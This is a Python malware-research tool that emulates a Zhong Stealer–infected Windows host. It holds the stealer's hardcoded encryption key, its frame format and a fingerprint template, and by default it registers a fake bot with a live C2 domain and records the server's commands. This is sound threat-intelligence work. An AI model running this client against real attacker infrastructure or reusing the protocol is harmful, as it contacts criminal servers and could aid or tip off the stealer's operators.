#!/usr/bin/env python3
"""
Zhong Stealer C2 Emulated Host
================================
Emulates an infected Windows host communicating with the Zhong Stealer
(APT-Q-27 / Golden Eye Dog) C2 server.

Protocol:
  - Plain HTTP WebSocket to uu.goldeyeuu.io:5188 (no TLS)
  - WS upgrade path: GET /\\ HTTP/1.1
  - REGISTER frame: 12-byte header + 191 bytes (zlib compressed, custom encrypted)
  - Encryption key: 32-byte static key (same for every bot)
  - After REGISTER: server ACKs with session_id, then sends keepalives

Usage:
  python3 zs_c2_client.py [options]

  --host HOST          C2 hostname (default: uu.goldeyeuu.io)
  --port PORT          C2 port (default: 5188)
  --victim-ip IP       Victim IP to report (default: 192.168.1.100)
  --victim-host NAME   Victim hostname to report (default: DESKTOP-ANALYSIS)
  --os-build BUILD     Windows build number to report (default: 19045)
  --listen-secs SECS   How long to listen for commands after register (default: 120)
  --replay             Replay the exact known-good AnyRun frame (bypasses synthesis)
  --dry-run            Build and print frame but do not connect
  -v / --verbose       Verbose output

References:
  - Sample: windui.dll SHA256 81e276aaa3eb9b3f595663c316b3c6414cc3dde5e6cc3a82856b7276acabb7de
  - PCAP:   44182f44-35a2-46c3-b8aa-a96766bcdcb0.pcap (AnyRun, 2026-04-11)
  - Decryptor: zs_register_decrypt.py
"""

import argparse
import datetime
import hashlib
import os
import socket
import struct
import sys
import time
import zlib
import base64
import logging

# ── Crypto ─────────────────────────────────────────────────────────────────────

# 32-byte static encryption key (hardcoded in windui.dll VA 0x10041060)
KEY = bytes.fromhex(
    "8A913610E905C3DD1F657811EA3B1933"
    "471B230F88E1C155616099A03AB0ABC0"
)


def encrypt_payload(data: bytes, key: bytes = KEY) -> bytes:
    """
    sub_10001ade encryption: applied AFTER zlib compress.
    op = i % 8; k = key[i % 32]
      op0: ^= k
      op1: += k>>1
      op2: -= k*4
      op3: += k<<2
      op4-7: identity
    """
    result = bytearray(data)
    for i in range(len(result)):
        op = i % 8
        k = key[i % 32]
        if op == 0:
            result[i] = (result[i] ^ k) & 0xFF
        elif op == 1:
            result[i] = (result[i] + (k >> 1)) & 0xFF
        elif op == 2:
            result[i] = (result[i] - k * 4) & 0xFF
        elif op == 3:
            result[i] = (result[i] + (k << 2)) & 0xFF
    return bytes(result)


def decrypt_payload(data: bytes, key: bytes = KEY) -> bytes:
    """Reverse of encrypt_payload — used to verify round-trips."""
    result = bytearray(data)
    for i in range(len(result)):
        op = i % 8
        k = key[i % 32]
        if op == 0:
            result[i] = (result[i] ^ k) & 0xFF
        elif op == 1:
            result[i] = (result[i] - (k >> 1)) & 0xFF
        elif op == 2:
            result[i] = (result[i] + k * 4) & 0xFF
        elif op == 3:
            result[i] = (result[i] - (k << 2)) & 0xFF
    return bytes(result)


# ── Fingerprint Builder ─────────────────────────────────────────────────────────

# Constant bytes extracted from both AnyRun captures.
# Layout of the 516-byte REGISTER plaintext:
#
#   [0:20]   OSVERSIONINFOEX header (dwSize, major, minor, build, platform)
#   [20:276] szCSDVersion[128] = empty string + stack residue
#   [276:284] OSVERSIONINFOEX tail (SP, suite, product type)
#   [276:284] these bytes vary; keeping them from template
#
# Stable constants found at specific offsets (same in both captures):
#   [144:150] MAC address fragment: b2:71:fc:76:9b:8c
#   [150:160] constant: 01 76 16 0c 00 00 06 00 00 00
#   [168:184] hostname (variable, patchable)
#   [216+4=220] DWORDs: 0x3e8, 0x17fa, 0x3f8b9 (hardware metrics)
#   [318:322]  "27+\x00"
#   [436:440]  "-/-\x00"

# AnyRun sample 1 full plaintext (decrypted, decompressed)
# Serves as our base template for fingerprint synthesis.
_TEMPLATE_PT_HEX = (
    "1c0100000a00000000000000654a000002000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "2cf11e03b271fc769b8c0176160c0000"  # 140-155: stack+MAC
    "06000000c0a8640a"                  # 156-163: count+IP (last byte patchable)
    "4445534b544f502d4a474c4c4a4c4400" # 168-183: "DESKTOP-JGLLJLD\x00"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "710200000000000000000000"          # 208-219: DWORD 0x271 + zeros
    "e8030000fa170000b9f803000000000000000000"        # 220-239: metrics
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "1200000015feffff140000008"         # 268-284: SP fields (stack residue)
    "1ff"                               # 284-285: prefix
    "323032362d30342d31312031333a35363a343100" # 286-305: "2026-04-11 13:56:41\x00"
    "e300000000000080e300000032372b00"  # 306-321: DWORDs+"27+"
    "0000000000000200000200000000"      # 322-335
    "ff0100fe0000000014000000e08fe300"  # 336-351
    "01000000000000000000000080000000"  # 352-367
    "40000000c000e3009c02e30000000000" # 368-383
    "000000001d00000020feffff000000002c000000" # 384-399
    "b271fc769b8cfc768000000"          # 400-411: MAC fragment
    "03f0000000000e3001f000000bf0000bf" # 412-427
    "1f0000002d2f2d00"                 # 428-435: "-/-\x00"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000"
    "00000000"
)

# Use the actual decoded binary from the verified AnyRun capture
# (exact 516 bytes extracted from PCAP, validated against zlib decompress)
import zlib as _zlib

_KNOWN_ENCRYPTED_191 = bytes.fromhex(
    "f2e4bba16460e0629fb2747306062686c612ae5be59837159f59375dc35826c6"
    "4908e846143bb0229afde579d83bc43f07e43f19c7c7cbc7e4584f8a819e79c1"
    "4608188b9c8161e71098c2380801b1e8f80c73818074e37f4233bfb35d03135d"
    "c98b2d83632b5333344563cac710850d67e73c981baa8f097ba49b9919fe8168"
    "1a462f3d8f191891d3a020a607907f8021d9d5b60c17970503353c1d60ff0331"
    "4e47a70a40eaedc13550530c03c9fd4043afe9317589f20bd0309c353530bf"
)

_TEMPLATE_PT = _zlib.decompress(decrypt_payload(_KNOWN_ENCRYPTED_191), wbits=15)
assert len(_TEMPLATE_PT) == 516, f"Template size mismatch: {len(_TEMPLATE_PT)}"


def build_fingerprint(
    victim_ip: str = "192.168.1.100",
    victim_hostname: str = "DESKTOP-ANALYSIS",
    os_build: int = 19045,
    os_major: int = 10,
    os_minor: int = 0,
    timestamp: datetime.datetime = None,
) -> bytes:
    """
    Build a 516-byte victim fingerprint for the REGISTER frame.

    Uses the verified AnyRun template as base, patching:
      - IP address at offset 164 (4 bytes)
      - Hostname at offset 168 (null-terminated, max ~40 chars)
      - OSVERSIONINFOEX build number at offset 12 (4 bytes)
      - Timestamp string at offset 286 (19 chars + null)
    """
    pt = bytearray(_TEMPLATE_PT)

    if timestamp is None:
        timestamp = datetime.datetime.now()
    ts_str = timestamp.strftime("%Y-%m-%d %H:%M:%S").encode("ascii")

    # Patch OS build number
    struct.pack_into("<I", pt, 0,  284)       # dwOSVersionInfoSize (keep)
    struct.pack_into("<I", pt, 4,  os_major)  # dwMajorVersion
    struct.pack_into("<I", pt, 8,  os_minor)  # dwMinorVersion
    struct.pack_into("<I", pt, 12, os_build)  # dwBuildNumber

    # Patch IP address (4 bytes at offset 164)
    try:
        ip_parts = [int(x) for x in victim_ip.split(".")]
        assert len(ip_parts) == 4
        pt[164:168] = bytes(ip_parts)
    except Exception:
        pass  # keep template IP

    # Patch hostname at offset 168 (clear old, write new, null-terminate)
    hostname_bytes = victim_hostname.encode("ascii")[:40]
    pt[168:168 + 40] = b"\x00" * 40
    pt[168:168 + len(hostname_bytes)] = hostname_bytes

    # Patch timestamp at offset 286 (20 bytes: 19 chars + null)
    pt[286:306] = ts_str + b"\x00"

    return bytes(pt)


def build_register_frame(
    plaintext_516: bytes,
    session_id: int = 0x094E,
) -> bytes:
    """
    Compress, encrypt, and wrap a 516-byte fingerprint into the REGISTER
    application payload.

    The malware's MSVC zlib at level=6 produces 191 bytes for the original
    AnyRun fingerprint. Python's zlib produces the same for the unmodified
    template, but may differ by ±1-2 bytes for synthesized fingerprints
    (hostname/timestamp differences shift compression output).

    The total_len field in the 12-byte header tells the server the actual
    frame size, so variable payload lengths are protocol-legal.

    Returns 12-byte header + N-byte encrypted payload.
    """
    assert len(plaintext_516) == 516

    compressed = zlib.compress(plaintext_516, level=6)
    encrypted = encrypt_payload(compressed)

    total_len = 12 + len(encrypted)
    orig_size = len(plaintext_516)

    header = struct.pack("<III", total_len, orig_size, session_id)
    return header + encrypted


# ── WebSocket (minimal RFC 6455 implementation) ─────────────────────────────────

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


class RawWebSocket:
    """
    Minimal WebSocket client over a plain TCP socket (no TLS).
    Implements only what Zhong Stealer needs: binary frames, masking.
    """

    def __init__(self, host: str, port: int, path: str = "/\\", timeout: float = 30.0):
        self.host = host
        self.port = port
        self.path = path
        self.timeout = timeout
        self._sock = None
        self._buf = bytearray()

    def connect(self):
        self._sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self._handshake()

    def _handshake(self):
        # Generate Sec-WebSocket-Key
        nonce = base64.b64encode(os.urandom(16)).decode()
        expected_accept = base64.b64encode(
            hashlib.sha1((nonce + WS_GUID).encode()).digest()
        ).decode()

        request = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Connection: Upgrade\r\n"
            f"Upgrade: websocket\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {nonce}\r\n"
            f"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n"
            f"\r\n"
        )
        self._sock.sendall(request.encode())

        # Read HTTP response
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = self._sock.recv(4096)
            if not chunk:
                raise ConnectionError("Server closed connection during WS handshake")
            resp += chunk

        if b"101 Switching Protocols" not in resp:
            raise ConnectionError(f"WS upgrade rejected:\n{resp.decode(errors='replace')}")

        logging.info("WebSocket handshake OK")

    def send_binary(self, payload: bytes):
        """Send a masked binary WebSocket frame (opcode 2)."""
        mask_key = os.urandom(4)
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask_key[i % 4]

        plen = len(payload)
        if plen < 126:
            header = bytes([0x82, 0x80 | plen])
        elif plen < 65536:
            header = bytes([0x82, 0xFE]) + struct.pack(">H", plen)
        else:
            header = bytes([0x82, 0xFF]) + struct.pack(">Q", plen)

        self._sock.sendall(header + mask_key + bytes(masked))

    def recv_frame(self, timeout: float = None) -> tuple:
        """
        Receive one WebSocket frame.
        Returns (opcode, payload_bytes) or raises TimeoutError / ConnectionError.
        """
        if timeout is not None:
            self._sock.settimeout(timeout)

        def read_exactly(n):
            while len(self._buf) < n:
                chunk = self._sock.recv(4096)
                if not chunk:
                    raise ConnectionError("Server closed connection")
                self._buf.extend(chunk)
            data = bytes(self._buf[:n])
            self._buf = self._buf[n:]
            return data

        b0, b1 = read_exactly(2)
        fin    = (b0 >> 7) & 1
        opcode = b0 & 0x0F
        masked = (b1 >> 7) & 1
        plen   = b1 & 0x7F

        if plen == 126:
            plen = struct.unpack(">H", read_exactly(2))[0]
        elif plen == 127:
            plen = struct.unpack(">Q", read_exactly(8))[0]

        mask_key = read_exactly(4) if masked else b"\x00\x00\x00\x00"
        raw = bytearray(read_exactly(plen))
        if masked:
            for i in range(len(raw)):
                raw[i] ^= mask_key[i % 4]

        return opcode, bytes(raw)

    def close(self):
        if self._sock:
            try:
                # Send close frame
                self._sock.sendall(bytes([0x88, 0x80]) + os.urandom(4))
            except Exception:
                pass
            self._sock.close()
            self._sock = None


# ── Frame Parser ────────────────────────────────────────────────────────────────

def parse_zhong_header(frame: bytes) -> dict:
    """Parse the 12-byte Zhong Stealer inner frame header."""
    if len(frame) < 12:
        return {"error": f"frame too short ({len(frame)} bytes)"}
    total_len, orig_size, session_id = struct.unpack_from("<III", frame, 0)
    payload = frame[12:]
    return {
        "total_len": total_len,
        "orig_size": orig_size,
        "session_id": session_id,
        "payload_len": len(payload),
        "payload": payload,
    }


def try_decrypt_incoming(payload: bytes) -> bytes | None:
    """
    Attempt to decrypt a server-to-client payload using the known static key.
    Not confirmed to work (server may use a different key or algorithm);
    logged for analysis.
    """
    if not payload:
        return None
    try:
        dec = decrypt_payload(payload)
        pt = zlib.decompress(dec, wbits=-15)
        return pt
    except Exception:
        return None


# ── Main Client ─────────────────────────────────────────────────────────────────

def run_client(args):
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s  %(levelname)-8s  %(message)s",
        datefmt="%H:%M:%S",
    )
    log = logging.getLogger("zs_c2")

    # ── Build REGISTER frame ───────────────────────────────────────────────────

    if args.replay:
        log.info("Replay mode: using exact AnyRun PCAP payload")
        register_app_payload = b"\xcb\x00\x00\x00\x04\x02\x00\x00\x4e\x09\x00\x00" + _KNOWN_ENCRYPTED_191
        fingerprint_pt = _TEMPLATE_PT
    else:
        log.info("Building synthetic fingerprint...")
        fingerprint_pt = build_fingerprint(
            victim_ip=args.victim_ip,
            victim_hostname=args.victim_host,
            os_build=args.os_build,
        )

        log.info(f"  Hostname:  {args.victim_host}")
        log.info(f"  IP:        {args.victim_ip}")
        log.info(f"  OS build:  {args.os_build}")
        log.info(f"  Timestamp: {fingerprint_pt[286:305].decode('ascii')}")

        register_app_payload = build_register_frame(fingerprint_pt, session_id=0x094E)

    log.info(f"REGISTER frame: {len(register_app_payload)} bytes")
    log.debug(f"  Frame hex: {register_app_payload.hex()}")

    if args.dry_run:
        print("\n=== DRY RUN — frame NOT sent ===")
        print(f"C2 target:   {args.host}:{args.port}")
        print(f"Frame bytes: {len(register_app_payload)}")
        print(f"Header:      {register_app_payload[:12].hex()}")
        print(f"Payload:     {register_app_payload[12:].hex()}")
        print(f"\nDecoded header:")
        h = parse_zhong_header(register_app_payload)
        print(f"  total_len={h['total_len']} orig_size={h['orig_size']} session_id=0x{h['session_id']:x}")
        print(f"\nFingerprint (first 64 bytes of 516):")
        for i in range(0, 64, 16):
            row = fingerprint_pt[i:i+16]
            print(f"  {i:04x}: {' '.join(f'{b:02x}' for b in row)}")
        return

    # ── Connect and register ───────────────────────────────────────────────────

    log.info(f"Connecting to {args.host}:{args.port}")
    ws = RawWebSocket(args.host, args.port, path="/\\", timeout=15.0)

    try:
        ws.connect()
    except Exception as e:
        log.error(f"Connection failed: {e}")
        sys.exit(1)

    log.info("Sending REGISTER frame...")
    ws.send_binary(register_app_payload)
    log.info("REGISTER sent. Waiting for server ACK...")

    # ── Receive ACK ───────────────────────────────────────────────────────────

    assigned_session_id = None
    try:
        opcode, frame_data = ws.recv_frame(timeout=10.0)
        h = parse_zhong_header(frame_data)
        log.info(
            f"[+] Server ACK received:"
            f"  total={h['total_len']}"
            f"  orig_size={h['orig_size']}"
            f"  session_id=0x{h['session_id']:04x}"
        )
        assigned_session_id = h["session_id"]

        if h["session_id"] == 0x1536:
            log.info("[+] ACK matches known deterministic response (session=0x1536)")
        else:
            log.info(f"[+] New session assigned: 0x{h['session_id']:04x}")

        if h["payload_len"] > 0:
            log.info(f"    Payload ({h['payload_len']} bytes): {h['payload'].hex()}")
            # Try decrypt
            pt = try_decrypt_incoming(h["payload"])
            if pt:
                log.info(f"    Decrypted: {pt.hex()}")
    except socket.timeout:
        log.warning("Timeout waiting for ACK — server may have rejected the frame")
    except Exception as e:
        log.error(f"Error receiving ACK: {e}")

    # ── Listen for incoming commands ───────────────────────────────────────────

    sid_str = f"0x{assigned_session_id:04x}" if assigned_session_id else "none"
    log.info(f"\nListening for C2 commands for {args.listen_secs}s (session={sid_str})")
    log.info("Press Ctrl+C to stop early.\n")

    deadline = time.time() + args.listen_secs
    frame_count = 0

    try:
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            try:
                opcode, frame_data = ws.recv_frame(timeout=min(remaining, 30.0))
                frame_count += 1
                ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:12]

                if opcode == 8:
                    log.warning(f"[{ts}] Server sent CLOSE frame")
                    break
                elif opcode == 9:
                    log.info(f"[{ts}] WS PING — sending PONG")
                    ws._sock.sendall(bytes([0x8A, 0x80]) + os.urandom(4))
                    continue
                elif opcode != 2:
                    log.debug(f"[{ts}] Non-binary frame opcode={opcode}: {frame_data.hex()}")
                    continue

                # Binary frame = Zhong protocol
                h = parse_zhong_header(frame_data)
                log.info(
                    f"[{ts}] INCOMING FRAME #{frame_count}:"
                    f"  total={h['total_len']}"
                    f"  orig_size={h['orig_size']}"
                    f"  session_id=0x{h['session_id']:04x}"
                    f"  payload={h['payload_len']} bytes"
                )

                if h["payload_len"] == 0:
                    log.info(f"    → Keepalive / heartbeat (no payload)")
                else:
                    log.info(f"    → Payload hex: {h['payload'][:64].hex()}"
                             + (" ..." if h["payload_len"] > 64 else ""))
                    # Attempt same-key decrypt
                    pt = try_decrypt_incoming(h["payload"])
                    if pt:
                        log.info(f"    → Decrypted ({len(pt)} bytes): {pt[:64].hex()}")
                    else:
                        log.info(f"    → Payload encrypted with different key (Blowfish?)")

                    # Save raw payload for offline analysis
                    fname = f"/home/remnux/mal/output/zs_incoming_0x{h['session_id']:04x}_{frame_count:03d}.bin"
                    with open(fname, "wb") as f:
                        f.write(frame_data)
                    log.info(f"    → Saved to {fname}")

            except socket.timeout:
                log.debug("recv timeout — server quiet, continuing to listen")
            except KeyboardInterrupt:
                log.info("Interrupted by user")
                break

    except KeyboardInterrupt:
        log.info("Stopping...")
    finally:
        ws.close()
        log.info(f"\nSession complete. {frame_count} frames received.")


# ── Entry Point ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Zhong Stealer C2 emulated host",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--host", default="uu.goldeyeuu.io",
                        help="C2 hostname")
    parser.add_argument("--port", type=int, default=5188,
                        help="C2 port")
    parser.add_argument("--victim-ip", default="192.168.1.100",
                        help="Victim IP to report in fingerprint")
    parser.add_argument("--victim-host", default="DESKTOP-ANALYSIS",
                        help="Victim hostname to report in fingerprint")
    parser.add_argument("--os-build", type=int, default=19045,
                        help="Windows build number (19045=Win10 21H2, 22621=Win11 22H2)")
    parser.add_argument("--listen-secs", type=int, default=120,
                        help="Seconds to listen for commands after register")
    parser.add_argument("--replay", action="store_true",
                        help="Replay exact AnyRun PCAP payload instead of synthesizing")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build frame but do not connect")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose logging")
    args = parser.parse_args()

    run_client(args)


if __name__ == "__main__":
    main()
